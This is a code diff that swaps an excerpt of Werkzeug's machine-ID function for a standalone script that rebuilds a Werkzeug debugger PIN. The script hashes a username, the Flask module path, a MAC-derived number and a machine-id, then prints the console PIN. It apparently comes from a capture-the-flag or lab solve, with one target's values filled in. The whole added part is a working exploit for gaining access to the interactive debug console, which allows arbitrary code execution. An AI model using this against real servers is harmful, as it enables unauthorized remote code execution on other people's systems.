@@ -1,35 +1,46 @@
-def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
-    global _machine_id
 
-    if _machine_id is not None:
-        return _machine_id
+import hashlib
+from itertools import chain
 
-    def _generate() -> t.Optional[t.Union[str, bytes]]:
-        linux = b""
+probably_public_bits = [
+	'coil',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'/usr/local/lib/python3.12/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
 
-        # machine-id is stable across boots, boot_id is not.
-        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
-            try:
-                with open(filename, "rb") as f:
-                    value = f.readline().strip()
-            except OSError:
-                continue
+private_bits = [
+	'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
+	'e90c95cfdecb4b06866f95ff2e7bc384'# get_machine_id(), /etc/machine-id
+]
 
-            if value:
-                linux += value
-                break
 
-        # Containers share the same machine id, add some cgroup
-        # information. This is used outside containers too but should be
-        # relatively stable across boots.
-        try:
-            with open("/proc/self/cgroup", "rb") as f:
-                linux += f.readline().strip().rpartition(b"/")[2]
-        except OSError:
-            pass
+# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+# h.update(b'shittysalt')
 
-        if linux:
-            return linux
+cookie_name = '__wzd' + h.hexdigest()[:20]
 
-        # On OS X, use ioreg to get the computer's serial number.
-        try:
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
